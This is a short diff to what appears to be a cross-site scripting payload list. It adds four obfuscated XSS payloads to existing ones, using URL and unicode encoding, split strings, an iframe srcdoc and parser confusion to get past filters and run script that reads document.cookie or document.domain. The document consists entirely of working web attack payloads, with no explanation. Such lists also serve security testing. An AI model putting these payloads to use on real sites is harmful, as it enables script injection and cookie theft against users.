@@ -42,3 +42,7 @@ document.write(atob(`PHNjcmlwdD5hbGVydChwYXlsb2FkKTwvc2NyaXB0Pg==`));
 ";(a=alert,b=1,a(b))//
 <logicalhunter/onmouseover=%0aalert%26%230000000096%3b1%26%230000000096%3b>Click Here
 <a/HREF="Javas%26%2399;ript:%0Athrow onerror=al\u0065rt,document.cooki\u0065">Click Here
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+xss'''><iframe srcdoc='%26it;script>;prompt`${document.domain}`%26it;/script>'>
+<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
